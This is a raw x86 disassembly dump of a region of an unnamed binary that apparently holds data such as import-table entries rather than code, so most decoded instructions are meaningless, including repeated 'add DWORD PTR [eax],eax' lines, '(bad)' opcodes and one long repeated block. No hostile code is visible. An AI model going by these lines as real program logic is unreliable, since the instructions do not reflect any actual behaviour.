  412049:	sub    DWORD PTR [ecx],eax
  41204b:	add    ah,bh
  41204d:	sub    DWORD PTR [ecx],eax
  41204f:	add    BYTE PTR [esi],al
  412051:	sub    al,BYTE PTR [ecx]
  412053:	add    BYTE PTR [edx],dl
  412055:	sub    al,BYTE PTR [ecx]
  412057:	add    BYTE PTR [esi],bl
  412059:	sub    al,BYTE PTR [ecx]
  41205b:	add    BYTE PTR [edx+ebp*1],ch
  41205e:	add    DWORD PTR [eax],eax
  412060:	sub    al,BYTE PTR ss:[ecx]
  412063:	add    BYTE PTR [edx+0x2a],al
  412066:	add    DWORD PTR [eax],eax
  412068:	dec    esp
  412069:	sub    al,BYTE PTR [ecx]
  41206b:	add    BYTE PTR [esi+0x2a],dl
  41206e:	add    DWORD PTR [eax],eax
  412070:	sub    al,BYTE PTR fs:[ecx]
  412073:	add    BYTE PTR [eax+0x2a],dh
  412076:	add    DWORD PTR [eax],eax
  412078:	js     0x4120a4
  41207a:	add    DWORD PTR [eax],eax
  41207c:	xchg   BYTE PTR [edx],ch
  41207e:	add    DWORD PTR [eax],eax
  412080:	nop
  412081:	sub    al,BYTE PTR [ecx]
  412083:	add    BYTE PTR [eax-0x5dfffed6],bl
  412089:	sub    al,BYTE PTR [ecx]
  41208b:	add    BYTE PTR [edx+ebp*1+0x2ab40001],ch
  412092:	add    DWORD PTR [eax],eax
  412094:	shr    BYTE PTR [edx],0x1
  412097:	add    ah,dl
  412099:	sub    al,BYTE PTR [ecx]
  41209b:	add    dh,bl
  41209d:	sub    al,BYTE PTR [ecx]
  41209f:	add    al,ch
  4120a1:	sub    al,BYTE PTR [ecx]
  4120a3:	add    al,dh
  4120a5:	sub    al,BYTE PTR [ecx]
  4120a7:	add    BYTE PTR [eax],al
  4120a9:	sub    eax,DWORD PTR [ecx]
  4120ab:	add    BYTE PTR [edx],cl
  4120ad:	sub    eax,DWORD PTR [ecx]
  4120af:	add    BYTE PTR [eax],al
  4120b1:	add    BYTE PTR [eax],al
  4120b3:	add    BYTE PTR [eax],ah
  4120b5:	sub    eax,DWORD PTR [ecx]
  4120b7:	add    BYTE PTR [ebx+ebp*1],dh
  4120ba:	add    DWORD PTR [eax],eax
  4120bc:	inc    esi
  4120bd:	sub    eax,DWORD PTR [ecx]
  4120bf:	add    BYTE PTR [edx+0x2b],dl
  4120c2:	add    DWORD PTR [eax],eax
  4120c4:	sub    eax,DWORD PTR fs:[ecx]
  4120c7:	add    BYTE PTR [esi+0x2b],dh
  4120ca:	add    DWORD PTR [eax],eax
  4120cc:	nop
  4120cd:	sub    eax,DWORD PTR [ecx]
  4120cf:	add    BYTE PTR [esi-0x47fffed5],ah
  4120d5:	sub    eax,DWORD PTR [ecx]
  4120d7:	add    ah,al
  4120d9:	sub    eax,DWORD PTR [ecx]
  4120db:	add    dl,dl
  4120dd:	sub    eax,DWORD PTR [ecx]
  4120df:	add    al,ah
  4120e1:	sub    eax,DWORD PTR [ecx]
  4120e3:	add    dl,ch
  4120e5:	sub    eax,DWORD PTR [ecx]
  4120e7:	add    dl,bh
  4120e9:	sub    eax,DWORD PTR [ecx]
  4120eb:	add    BYTE PTR [edx],cl
  4120ed:	sub    al,0x1
  4120ef:	add    BYTE PTR [esi],dl
  4120f1:	sub    al,0x1
  4120f3:	add    BYTE PTR [eax],dh
  4120f5:	sub    al,0x1
  4120f7:	add    BYTE PTR [esp+ebp*1],bh
  4120fa:	add    DWORD PTR [eax],eax
  4120fc:	inc    esi
  4120fd:	sub    al,0x1
  4120ff:	add    BYTE PTR [esi+0x2c],dl
  412102:	add    DWORD PTR [eax],eax
  412104:	bound  ebp,QWORD PTR [ecx+eax*1]
  412107:	add    BYTE PTR [eax+0x2c],bh
  41210a:	add    DWORD PTR [eax],eax
  41210c:	test   BYTE PTR [ecx+eax*1],ch
  41210f:	add    BYTE PTR [eax-0x57fffed4],bl
  412115:	sub    al,0x1
  412117:	add    BYTE PTR [esp+ebp*1+0x2cc40001],dh
  41211e:	add    DWORD PTR [eax],eax
  412120:	(bad)  
  412121:	sub    al,0x1
  412123:	add    al,ch
  412125:	sub    al,0x1
  412127:	add    dh,bh
  412129:	sub    al,0x1
  41212b:	add    BYTE PTR [esi],cl
  41212d:	sub    eax,0x2d1e0001
  412132:	add    DWORD PTR [eax],eax
  412134:	sub    ch,BYTE PTR ds:0x2d3a0001
  41213a:	add    DWORD PTR [eax],eax
  41213c:	dec    esp
  41213d:	sub    eax,0x2d5e0001
  412142:	add    DWORD PTR [eax],eax
  412144:	je     0x412173
  412146:	add    DWORD PTR [eax],eax
  412148:	sub    BYTE PTR ds:0x2d900001,0x1
  41214f:	add    BYTE PTR [esi-0x4bfffed3],bl
  412155:	sub    eax,0x2dc00001
  41215a:	add    DWORD PTR [eax],eax
  41215c:	shr    BYTE PTR ds:0x2de40001,cl
  412162:	add    DWORD PTR [eax],eax
  412164:	imul   BYTE PTR ds:0x2e020001
  41216a:	add    DWORD PTR [eax],eax
  41216c:	adc    BYTE PTR [esi],ch
  41216e:	add    DWORD PTR [eax],eax
  412170:	and    BYTE PTR [esi],ch
  412172:	add    DWORD PTR [eax],eax
  412174:	sub    al,0x2e
  412176:	add    DWORD PTR [eax],eax
  412178:	ds add DWORD PTR cs:[eax],eax
  41217c:	dec    esp
  41217d:	add    DWORD PTR cs:[eax],eax
  412180:	pop    edx
  412181:	add    DWORD PTR cs:[eax],eax
  412184:	jo     0x4121b4
  412186:	add    DWORD PTR [eax],eax
  412188:	jle    0x4121b8
  41218a:	add    DWORD PTR [eax],eax
  41218c:	mov    ch,BYTE PTR [esi]
  41218e:	add    DWORD PTR [eax],eax
  412190:	call   0x12e:0xae00012e
  412197:	add    ah,al
  412199:	add    DWORD PTR cs:[eax],eax
  41219c:	aam    0x2e
  41219e:	add    DWORD PTR [eax],eax
  4121a0:	fisubr WORD PTR [esi]
  4121a2:	add    DWORD PTR [eax],eax
  4121a4:	in     al,dx
  4121a5:	add    DWORD PTR cs:[eax],eax
  4121a8:	(bad)  
  4121a9:	add    DWORD PTR cs:[eax],eax
  4121ac:	or     al,0x2f
  4121ae:	add    DWORD PTR [eax],eax
  4121b0:	and    al,0x2f
  4121b2:	add    DWORD PTR [eax],eax
  4121b4:	ss das 
  4121b6:	add    DWORD PTR [eax],eax
  4121b8:	dec    eax
  4121b9:	das    
  4121ba:	add    DWORD PTR [eax],eax
  4121bc:	push   esi
  4121bd:	das    
  4121be:	add    DWORD PTR [eax],eax
  4121c0:	fs das 
  4121c2:	add    DWORD PTR [eax],eax
  4121c4:	js     0x4121f5
  4121c6:	add    DWORD PTR [eax],eax
  4121c8:	mov    ch,BYTE PTR [edi]
  4121ca:	add    DWORD PTR [eax],eax
  4121cc:	pushf  
  4121cd:	das    
  4121ce:	add    DWORD PTR [eax],eax
  4121d0:	test   al,0x2f
  4121d2:	add    DWORD PTR [eax],eax
  4121d4:	mov    esp,0xc800012f
  4121d9:	das    
  4121da:	add    DWORD PTR [eax],eax
  4121dc:	fisubr WORD PTR [edi]
  4121de:	add    DWORD PTR [eax],eax
  4121e0:	repnz das 
  4121e2:	add    DWORD PTR [eax],eax
  4121e4:	(bad)  
  4121e5:	das    
  4121e6:	add    DWORD PTR [eax],eax
  4121e8:	or     BYTE PTR [eax],dh
  4121ea:	add    DWORD PTR [eax],eax
  4121ec:	push   ss
  4121ed:	xor    BYTE PTR [ecx],al
  4121ef:	add    BYTE PTR [esi],ah
  4121f1:	xor    BYTE PTR [ecx],al
  4121f3:	add    BYTE PTR [esi],bh
  4121f5:	xor    BYTE PTR [ecx],al
  4121f7:	add    BYTE PTR [eax+0x30],dl
  4121fa:	add    DWORD PTR [eax],eax
  4121fc:	bound  esi,QWORD PTR [eax]
  4121fe:	add    DWORD PTR [eax],eax
  412200:	outs   dx,BYTE PTR ds:[esi]
  412201:	xor    BYTE PTR [ecx],al
  412203:	add    BYTE PTR [eax-0x71fffed0],al
  412209:	xor    BYTE PTR [ecx],al
  41220b:	add    BYTE PTR [eax+esi*1+0x30ac0001],bl
  412212:	add    DWORD PTR [eax],eax
  412214:	mov    esi,0xcc000130
  412219:	xor    BYTE PTR [ecx],al
  41221b:	add    al,bl
  41221d:	xor    BYTE PTR [ecx],al
  41221f:	add    dh,ah
  412221:	xor    BYTE PTR [ecx],al
  412223:	add    al,bh
  412225:	xor    BYTE PTR [ecx],al
  412227:	add    BYTE PTR [esi],al
  412229:	xor    DWORD PTR [ecx],eax
  41222b:	add    BYTE PTR [edx],dl
  41222d:	xor    DWORD PTR [ecx],eax
  41222f:	add    BYTE PTR [ecx+esi*1],ah
  412232:	add    DWORD PTR [eax],eax
  412234:	cmp    BYTE PTR [ecx],dh
  412236:	add    DWORD PTR [eax],eax
  412238:	dec    edx
  412239:	xor    DWORD PTR [ecx],eax
  41223b:	add    BYTE PTR [edx+0x31],bl
  41223e:	add    DWORD PTR [eax],eax
  412240:	push   0x31
  412242:	add    DWORD PTR [eax],eax
  412244:	js     0x412277
  412246:	add    DWORD PTR [eax],eax
  412248:	xchg   esi,eax
  412249:	xor    DWORD PTR [ecx],eax
  41224b:	add    BYTE PTR [ecx+esi*1+0x31b40001],ah
  412252:	add    DWORD PTR [eax],eax
  412254:	shl    BYTE PTR [ecx],cl
  412256:	add    DWORD PTR [eax],eax
  412258:	in     al,0x31
  41225a:	add    DWORD PTR [eax],eax
  41225c:	cld    
  41225d:	xor    DWORD PTR [ecx],eax
  41225f:	add    BYTE PTR [edx],cl
  412261:	xor    al,BYTE PTR [ecx]
  412263:	add    BYTE PTR [eax],al
  412265:	add    BYTE PTR [eax],al
  412267:	add    BYTE PTR [edx+esi*1],ch
  41226a:	add    DWORD PTR [eax],eax
  41226c:	inc    esp
  41226d:	xor    al,BYTE PTR [ecx]
  41226f:	add    BYTE PTR [esi+0x32],dl
  412272:	add    DWORD PTR [eax],eax
  412274:	outs   dx,BYTE PTR ds:[esi]
  412275:	xor    al,BYTE PTR [ecx]
  412277:	add    BYTE PTR [eax-0x63fffece],al
  41227d:	xor    al,BYTE PTR [ecx]
  41227f:	add    BYTE PTR [eax],al
  412281:	add    BYTE PTR [eax],al
  412283:	add    BYTE PTR [edx+esi*1+0x32d60001],bh
  41228a:	add    DWORD PTR [eax],eax
  41228c:	out    0x32,al
  41228e:	add    DWORD PTR [eax],eax
  412290:	cli    
  412291:	xor    al,BYTE PTR [ecx]
  412293:	add    BYTE PTR [edx],cl
  412295:	xor    eax,DWORD PTR [ecx]
  412297:	add    BYTE PTR [eax],ah
  412299:	xor    eax,DWORD PTR [ecx]
  41229b:	add    BYTE PTR [esi],dh
  41229d:	xor    eax,DWORD PTR [ecx]
  41229f:	add    BYTE PTR [ebx+esi*1+0x1],al
  4122a3:	add    BYTE PTR [eax+0x33],dl
  4122a6:	add    DWORD PTR [eax],eax
  4122a8:	pop    esp
  4122a9:	xor    eax,DWORD PTR [ecx]
  4122ab:	add    BYTE PTR [esi+0x33],ah
  4122ae:	add    DWORD PTR [eax],eax
  4122b0:	je     0x4122e5
  4122b2:	add    DWORD PTR [eax],eax
  4122b4:	xor    BYTE PTR [ebx],0x1
  4122b7:	add    BYTE PTR [ebx+esi*1+0x33aa0001],bl
  4122be:	add    DWORD PTR [eax],eax
  4122c0:	ret    0x133
  4122c3:	add    dh,dl
  4122c5:	xor    eax,DWORD PTR [ecx]
  4122c7:	add    dh,ch
  4122c9:	xor    eax,DWORD PTR [ecx]
  4122cb:	add    ah,bh
  4122cd:	xor    eax,DWORD PTR [ecx]
  4122cf:	add    BYTE PTR [esi],dl
  4122d1:	xor    al,0x1
  4122d3:	add    BYTE PTR [edx],ch
  4122d5:	xor    al,0x1
  4122d7:	add    BYTE PTR [esp+esi*1],dh
  4122da:	add    DWORD PTR [eax],eax
  4122dc:	inc    esp
  4122dd:	xor    al,0x1
  4122df:	add    BYTE PTR [esi+0x34],cl
  4122e2:	add    DWORD PTR [eax],eax
  4122e4:	pop    edx
  4122e5:	xor    al,0x1
  4122e7:	add    BYTE PTR [esi+0x34],ch
  4122ea:	add    DWORD PTR [eax],eax
  4122ec:	xchg   BYTE PTR [ecx+eax*1],dh
  4122ef:	add    BYTE PTR [esp+esi*1+0x349e0001],dl
  4122f6:	add    DWORD PTR [eax],eax
  4122f8:	mov    dl,0x34
  4122fa:	add    DWORD PTR [eax],eax
  4122fc:	enter  0x134,0x0
  412300:	fidiv  DWORD PTR [ecx+eax*1]
  412303:	add    dh,ah
  412305:	xor    al,0x1
  412307:	add    dl,bh
  412309:	xor    al,0x1
  41230b:	add    BYTE PTR [esi*1+0x350e0001],al
  412312:	add    DWORD PTR [eax],eax
  412314:	push   ds
  412315:	xor    eax,0x35360001
  41231a:	add    DWORD PTR [eax],eax
  41231c:	dec    edx
  41231d:	xor    eax,0x355a0001
  412322:	add    DWORD PTR [eax],eax
  412324:	xor    ax,0x1
  412328:	je     0x41235f
  41232a:	add    DWORD PTR [eax],eax
  41232c:	mov    dh,BYTE PTR ds:0x359c0001
  412332:	add    DWORD PTR [eax],eax
  412334:	add    BYTE PTR [eax],al
  412336:	add    BYTE PTR [eax],al
  412338:	mov    edx,0xce000135
  41233d:	xor    eax,0x35e00001
  412342:	add    DWORD PTR [eax],eax
  412344:	in     al,dx
  412345:	xor    eax,0x36040001
  41234a:	add    DWORD PTR [eax],eax
  41234c:	adc    al,0x36
  41234e:	add    DWORD PTR [eax],eax
  412350:	sub    BYTE PTR [esi],dh
  412352:	add    DWORD PTR [eax],eax
  412354:	ds add DWORD PTR ss:[eax],eax
  412358:	dec    esi
  412359:	add    DWORD PTR ss:[eax],eax
  41235c:	pusha  
  41235d:	add    DWORD PTR ss:[eax],eax
  412360:	ins    BYTE PTR es:[edi],dx
  412361:	add    DWORD PTR ss:[eax],eax
  412364:	xor    BYTE PTR [esi],0x1
  412367:	add    BYTE PTR [esi-0x49fffeca],bl
  41236d:	add    DWORD PTR ss:[eax],eax
  412370:	retf   0x136
  412373:	add    dl,bl
  412375:	add    DWORD PTR ss:[eax],eax
  412378:	out    0x36,al
  41237a:	add    DWORD PTR [eax],eax
  41237c:	(bad)  
  41237d:	add    DWORD PTR ss:[eax],eax
  412380:	adc    BYTE PTR [edi],dh
  412382:	add    DWORD PTR [eax],eax
  412384:	and    dh,BYTE PTR [edi]
  412386:	add    DWORD PTR [eax],eax
  412388:	xor    dh,BYTE PTR [edi]
  41238a:	add    DWORD PTR [eax],eax
  41238c:	inc    esp
  41238d:	aaa    
  41238e:	add    DWORD PTR [eax],eax
  412390:	push   eax
  412391:	aaa    
  412392:	add    DWORD PTR [eax],eax
  412394:	pusha  
  412395:	aaa    
  412396:	add    DWORD PTR [eax],eax
  412398:	outs   dx,BYTE PTR ds:[esi]
  412399:	aaa    
  41239a:	add    DWORD PTR [eax],eax
  41239c:	js     0x4123d5
  41239e:	add    DWORD PTR [eax],eax
  4123a0:	mov    BYTE PTR [edi],dh
  4123a2:	add    DWORD PTR [eax],eax
  4123a4:	xchg   esi,eax
  4123a5:	aaa    
  4123a6:	add    DWORD PTR [eax],eax
  4123a8:	test   al,0x37
  4123aa:	add    DWORD PTR [eax],eax
  4123ac:	mov    esi,0xd2000137
  4123b1:	aaa    
  4123b2:	add    DWORD PTR [eax],eax
  4123b4:	jmp    0x138:0x137
  4123bb:	add    BYTE PTR [esi],cl
  4123bd:	cmp    BYTE PTR [ecx],al
  4123bf:	add    BYTE PTR [esi],ah
  4123c1:	cmp    BYTE PTR [ecx],al
  4123c3:	add    BYTE PTR [eax+edi*1],bh
  4123c6:	add    DWORD PTR [eax],eax
  4123c8:	dec    esp
  4123c9:	cmp    BYTE PTR [ecx],al
  4123cb:	add    BYTE PTR [eax+0x38],bl
  4123ce:	add    DWORD PTR [eax],eax
  4123d0:	jo     0x41240a
  4123d2:	add    DWORD PTR [eax],eax
  4123d4:	jle    0x41240e
  4123d6:	add    DWORD PTR [eax],eax
  4123d8:	xchg   edx,eax
  4123d9:	cmp    BYTE PTR [ecx],al
  4123db:	add    BYTE PTR [esi-0x51fffec8],bl
  4123e1:	cmp    BYTE PTR [ecx],al
  4123e3:	add    dh,al
  4123e5:	cmp    BYTE PTR [ecx],al
  4123e7:	add    dl,bl
  4123e9:	cmp    BYTE PTR [ecx],al
  4123eb:	add    al,ch
  4123ed:	cmp    BYTE PTR [ecx],al
  4123ef:	add    dh,bh
  4123f1:	cmp    BYTE PTR [ecx],al
  4123f3:	add    BYTE PTR [edx],dl
  4123f5:	cmp    DWORD PTR [ecx],eax
  4123f7:	add    BYTE PTR [esi],bl
  4123f9:	cmp    DWORD PTR [ecx],eax
  4123fb:	add    BYTE PTR [eax],bh
  4123fd:	cmp    DWORD PTR [ecx],eax
  4123ff:	add    BYTE PTR [eax],al
  412401:	add    BYTE PTR [eax],al
  412403:	add    BYTE PTR [ecx+edi*1+0x1],bl
  412407:	add    BYTE PTR [edx+0x39],dh
  41240a:	add    DWORD PTR [eax],eax
	...
  412414:	popf   
  412415:	dec    esp
  412416:	(bad)  
  412417:	dec    ebp
  412418:	add    BYTE PTR [eax],al
  41241a:	add    BYTE PTR [eax],al
  41241c:	add    al,BYTE PTR [eax]
  41241e:	add    BYTE PTR [eax],al
  412420:	inc    edx
  412421:	add    BYTE PTR [eax],al
  412423:	add    BYTE PTR [edx+edi*1+0x3],dl
  412427:	add    BYTE PTR [edx+ebp*1+0x3],dl
	...
  412433:	add    BYTE PTR [ebp+0x4dc74c],bl
  412439:	add    BYTE PTR [eax],al
  41243b:	add    BYTE PTR [edx+0x24],ah
  41243e:	add    DWORD PTR [eax],eax
  412440:	add    DWORD PTR [eax],eax
  412442:	add    BYTE PTR [eax],al
  412444:	add    DWORD PTR [eax],eax
  412446:	add    BYTE PTR [eax],al
  412448:	add    DWORD PTR [eax],eax
  41244a:	add    BYTE PTR [eax],al
  41244c:	pop    eax
  41244d:	and    al,0x1
  41244f:	add    BYTE PTR [esp+0x1],bl
  412453:	add    BYTE PTR [eax+0x24],ah
  412456:	add    DWORD PTR [eax],eax
  412458:	lock xor al,BYTE PTR [eax]
  41245b:	add    BYTE PTR [ebx+0x24],dh
  41245e:	add    DWORD PTR [eax],eax
  412460:	add    BYTE PTR [eax],al
  412462:	outs   dx,BYTE PTR ds:[esi]
  412463:	push   esi
  412464:	popa   
  412465:	addr16 inc edi
  412467:	push   edi
  412468:	js     0x4124be
  41246a:	outs   dx,DWORD PTR ds:[esi]
  41246b:	ss addr16 xor al,0x2e
  41246f:	je     0x4124e0
  412471:	jo     0x412473
  412473:	aas    
  412474:	inc    edi
  412475:	outs   dx,BYTE PTR gs:[esi]
  412477:	gs jb  0x4124db
  41247a:	je     0x4124e1
  41247c:	push   esp
  41247d:	gs js  0x4124f4
  412480:	push   edi
  412481:	inc    eax
  412482:	inc    eax
  412483:	pop    ecx
  412484:	inc    edi
  412485:	push   eax
  412486:	inc    ecx
  412487:	dec    edx
  412488:	pop    edi
  412489:	dec    esi
  41248a:	cmp    al,0x56
  41248c:	add    BYTE PTR [eax],al
  41248e:	add    BYTE PTR [eax],al
  412490:	sbb    al,0x25
  412492:	add    DWORD PTR [eax],eax
	...
  41249c:	adc    al,0x2b
  41249e:	add    DWORD PTR [eax],eax
  4124a0:	add    BYTE PTR [eax],ah
  4124a2:	add    DWORD PTR [eax],eax
  4124a4:	shl    BYTE PTR ds:0x1,1
  4124aa:	add    BYTE PTR [eax],al
  4124ac:	add    BYTE PTR [eax],al
  4124ae:	add    BYTE PTR [eax],al
  4124b0:	and    BYTE PTR [edx],dh
  4124b2:	add    DWORD PTR [eax],eax
  4124b4:	mov    ah,0x20
  4124b6:	add    DWORD PTR [eax],eax
  4124b8:	test   BYTE PTR [edi],ah
  4124ba:	add    DWORD PTR [eax],eax
	...
  4124c4:	scas   al,BYTE PTR es:[edi]
  4124c5:	xor    al,BYTE PTR [ecx]
  4124c7:	add    BYTE PTR [eax+0x22],ch
  4124ca:	add    DWORD PTR [eax],eax
  4124cc:	mov    al,ds:0x127
  4124d1:	add    BYTE PTR [eax],al
  4124d3:	add    BYTE PTR [eax],al
  4124d5:	add    BYTE PTR [eax],al
  4124d7:	add    BYTE PTR [eax-0x7bfffecb],dh
  4124dd:	and    al,BYTE PTR [ecx]
  4124df:	add    BYTE PTR [eax+ebp*1+0x1],dl
	...
  4124eb:	add    BYTE PTR [esi+0x39],cl
  4124ee:	add    DWORD PTR [eax],eax
  4124f0:	cmp    BYTE PTR [ebx],ah
  4124f2:	add    DWORD PTR [eax],eax
  4124f4:	and    BYTE PTR [ecx],ch
  4124f6:	add    DWORD PTR [eax],eax
	...
  412500:	mov    BYTE PTR [ecx],bh
  412502:	add    DWORD PTR [eax],eax
  412504:	add    al,0x24
  412506:	add    DWORD PTR [eax],eax
	...
  41251c:	sub    al,0x29
  41251e:	add    DWORD PTR [eax],eax
  412520:	sub    DWORD PTR ss:[ecx],eax
  412523:	add    BYTE PTR [eax+0x29],al
  412526:	add    DWORD PTR [eax],eax
  412528:	dec    esi
  412529:	sub    DWORD PTR [ecx],eax
  41252b:	add    BYTE PTR [eax+0x29],bl
  41252e:	add    DWORD PTR [eax],eax
  412530:	bound  ebp,QWORD PTR [ecx]
  412532:	add    DWORD PTR [eax],eax
  412534:	ins    BYTE PTR es:[edi],dx
  412535:	sub    DWORD PTR [ecx],eax
  412537:	add    BYTE PTR [esi+0x29],dh
  41253a:	add    DWORD PTR [eax],eax
  41253c:	mov    BYTE PTR [ecx],ch
  41253e:	add    DWORD PTR [eax],eax
  412540:	xchg   edx,eax
  412541:	sub    DWORD PTR [ecx],eax
  412543:	add    BYTE PTR [edx-0x5dfffed7],bl
  412549:	sub    DWORD PTR [ecx],eax
  41254b:	add    BYTE PTR [esi-0x43fffed7],ch
  412551:	sub    DWORD PTR [ecx],eax
  412553:	add    dh,al
  412555:	sub    DWORD PTR [ecx],eax
  412557:	add    dl,dl
  412559:	sub    DWORD PTR [ecx],eax
  41255b:	add    ah,bl
  41255d:	sub    DWORD PTR [ecx],eax
  41255f:	add    ah,ch
  412561:	sub    DWORD PTR [ecx],eax
  412563:	add    ah,dh
  412565:	sub    DWORD PTR [ecx],eax
  412567:	add    ah,bh
  412569:	sub    DWORD PTR [ecx],eax
  41256b:	add    BYTE PTR [esi],al
  41256d:	sub    al,BYTE PTR [ecx]
  41256f:	add    BYTE PTR [edx],dl
  412571:	sub    al,BYTE PTR [ecx]
  412573:	add    BYTE PTR [esi],bl
  412575:	sub    al,BYTE PTR [ecx]
  412577:	add    BYTE PTR [edx+ebp*1],ch
  41257a:	add    DWORD PTR [eax],eax
  41257c:	sub    al,BYTE PTR ss:[ecx]
  41257f:	add    BYTE PTR [edx+0x2a],al
  412582:	add    DWORD PTR [eax],eax
  412584:	dec    esp
  412585:	sub    al,BYTE PTR [ecx]
  412587:	add    BYTE PTR [esi+0x2a],dl
  41258a:	add    DWORD PTR [eax],eax
  41258c:	sub    al,BYTE PTR fs:[ecx]
  41258f:	add    BYTE PTR [eax+0x2a],dh
  412592:	add    DWORD PTR [eax],eax
  412594:	js     0x4125c0
  412596:	add    DWORD PTR [eax],eax
  412598:	xchg   BYTE PTR [edx],ch
  41259a:	add    DWORD PTR [eax],eax
  41259c:	nop
  41259d:	sub    al,BYTE PTR [ecx]
  41259f:	add    BYTE PTR [eax-0x5dfffed6],bl
  4125a5:	sub    al,BYTE PTR [ecx]
  4125a7:	add    BYTE PTR [edx+ebp*1+0x2ab40001],ch
  4125ae:	add    DWORD PTR [eax],eax
  4125b0:	shr    BYTE PTR [edx],0x1
  4125b3:	add    ah,dl
  4125b5:	sub    al,BYTE PTR [ecx]
  4125b7:	add    dh,bl
  4125b9:	sub    al,BYTE PTR [ecx]
  4125bb:	add    al,ch
  4125bd:	sub    al,BYTE PTR [ecx]
  4125bf:	add    al,dh
  4125c1:	sub    al,BYTE PTR [ecx]
  4125c3:	add    BYTE PTR [eax],al
  4125c5:	sub    eax,DWORD PTR [ecx]
  4125c7:	add    BYTE PTR [edx],cl
  4125c9:	sub    eax,DWORD PTR [ecx]
  4125cb:	add    BYTE PTR [eax],al
  4125cd:	add    BYTE PTR [eax],al
  4125cf:	add    BYTE PTR [eax],ah
  4125d1:	sub    eax,DWORD PTR [ecx]
  4125d3:	add    BYTE PTR [ebx+ebp*1],dh
  4125d6:	add    DWORD PTR [eax],eax
  4125d8:	inc    esi
  4125d9:	sub    eax,DWORD PTR [ecx]
  4125db:	add    BYTE PTR [edx+0x2b],dl
  4125de:	add    DWORD PTR [eax],eax
  4125e0:	sub    eax,DWORD PTR fs:[ecx]
  4125e3:	add    BYTE PTR [esi+0x2b],dh
  4125e6:	add    DWORD PTR [eax],eax
  4125e8:	nop
  4125e9:	sub    eax,DWORD PTR [ecx]
  4125eb:	add    BYTE PTR [esi-0x47fffed5],ah
  4125f1:	sub    eax,DWORD PTR [ecx]
  4125f3:	add    ah,al
  4125f5:	sub    eax,DWORD PTR [ecx]
  4125f7:	add    dl,dl
  4125f9:	sub    eax,DWORD PTR [ecx]
  4125fb:	add    al,ah
  4125fd:	sub    eax,DWORD PTR [ecx]
  4125ff:	add    dl,ch
  412601:	sub    eax,DWORD PTR [ecx]
  412603:	add    dl,bh
  412605:	sub    eax,DWORD PTR [ecx]
  412607:	add    BYTE PTR [edx],cl
  412609:	sub    al,0x1
  41260b:	add    BYTE PTR [esi],dl
  41260d:	sub    al,0x1
  41260f:	add    BYTE PTR [eax],dh
  412611:	sub    al,0x1
  412613:	add    BYTE PTR [esp+ebp*1],bh
  412616:	add    DWORD PTR [eax],eax
  412618:	inc    esi
  412619:	sub    al,0x1
  41261b:	add    BYTE PTR [esi+0x2c],dl
  41261e:	add    DWORD PTR [eax],eax
  412620:	bound  ebp,QWORD PTR [ecx+eax*1]
  412623:	add    BYTE PTR [eax+0x2c],bh
  412626:	add    DWORD PTR [eax],eax
  412628:	test   BYTE PTR [ecx+eax*1],ch
  41262b:	add    BYTE PTR [eax-0x57fffed4],bl
  412631:	sub    al,0x1
  412633:	add    BYTE PTR [esp+ebp*1+0x2cc40001],dh
  41263a:	add    DWORD PTR [eax],eax
  41263c:	(bad)  
  41263d:	sub    al,0x1
  41263f:	add    al,ch
  412641:	sub    al,0x1
  412643:	add    dh,bh
  412645:	sub    al,0x1
  412647:	add    BYTE PTR [esi],cl
  412649:	sub    eax,0x2d1e0001
  41264e:	add    DWORD PTR [eax],eax
  412650:	sub    ch,BYTE PTR ds:0x2d3a0001
  412656:	add    DWORD PTR [eax],eax
  412658:	dec    esp
  412659:	sub    eax,0x2d5e0001
  41265e:	add    DWORD PTR [eax],eax
  412660:	je     0x41268f
  412662:	add    DWORD PTR [eax],eax
  412664:	sub    BYTE PTR ds:0x2d900001,0x1
  41266b:	add    BYTE PTR [esi-0x4bfffed3],bl
  412671:	sub    eax,0x2dc00001
  412676:	add    DWORD PTR [eax],eax
  412678:	shr    BYTE PTR ds:0x2de40001,cl
  41267e:	add    DWORD PTR [eax],eax
  412680:	imul   BYTE PTR ds:0x2e020001
  412686:	add    DWORD PTR [eax],eax
  412688:	adc    BYTE PTR [esi],ch
  41268a:	add    DWORD PTR [eax],eax
  41268c:	and    BYTE PTR [esi],ch
  41268e:	add    DWORD PTR [eax],eax
  412690:	sub    al,0x2e
  412692:	add    DWORD PTR [eax],eax
  412694:	ds add DWORD PTR cs:[eax],eax
  412698:	dec    esp
  412699:	add    DWORD PTR cs:[eax],eax
  41269c:	pop    edx
  41269d:	add    DWORD PTR cs:[eax],eax
  4126a0:	jo     0x4126d0
  4126a2:	add    DWORD PTR [eax],eax
  4126a4:	jle    0x4126d4
  4126a6:	add    DWORD PTR [eax],eax
  4126a8:	mov    ch,BYTE PTR [esi]
  4126aa:	add    DWORD PTR [eax],eax
  4126ac:	call   0x12e:0xae00012e
  4126b3:	add    ah,al
  4126b5:	add    DWORD PTR cs:[eax],eax
  4126b8:	aam    0x2e
  4126ba:	add    DWORD PTR [eax],eax
  4126bc:	fisubr WORD PTR [esi]
  4126be:	add    DWORD PTR [eax],eax
  4126c0:	in     al,dx
  4126c1:	add    DWORD PTR cs:[eax],eax
  4126c4:	(bad)  
  4126c5:	add    DWORD PTR cs:[eax],eax
  4126c8:	or     al,0x2f
  4126ca:	add    DWORD PTR [eax],eax
  4126cc:	and    al,0x2f
  4126ce:	add    DWORD PTR [eax],eax
  4126d0:	ss das 
  4126d2:	add    DWORD PTR [eax],eax
  4126d4:	dec    eax
  4126d5:	das    
  4126d6:	add    DWORD PTR [eax],eax
  4126d8:	push   esi
  4126d9:	das    
  4126da:	add    DWORD PTR [eax],eax
  4126dc:	fs das 
  4126de:	add    DWORD PTR [eax],eax
  4126e0:	js     0x412711
  4126e2:	add    DWORD PTR [eax],eax
  4126e4:	mov    ch,BYTE PTR [edi]
  4126e6:	add    DWORD PTR [eax],eax
  4126e8:	pushf  
  4126e9:	das    
  4126ea:	add    DWORD PTR [eax],eax
  4126ec:	test   al,0x2f
  4126ee:	add    DWORD PTR [eax],eax
  4126f0:	mov    esp,0xc800012f
  4126f5:	das    
  4126f6:	add    DWORD PTR [eax],eax
  4126f8:	fisubr WORD PTR [edi]
  4126fa:	add    DWORD PTR [eax],eax
  4126fc:	repnz das 
  4126fe:	add    DWORD PTR [eax],eax
  412700:	(bad)  
  412701:	das    
  412702:	add    DWORD PTR [eax],eax
  412704:	or     BYTE PTR [eax],dh
  412706:	add    DWORD PTR [eax],eax
  412708:	push   ss
  412709:	xor    BYTE PTR [ecx],al
  41270b:	add    BYTE PTR [esi],ah
  41270d:	xor    BYTE PTR [ecx],al
  41270f:	add    BYTE PTR [esi],bh
  412711:	xor    BYTE PTR [ecx],al
  412713:	add    BYTE PTR [eax+0x30],dl
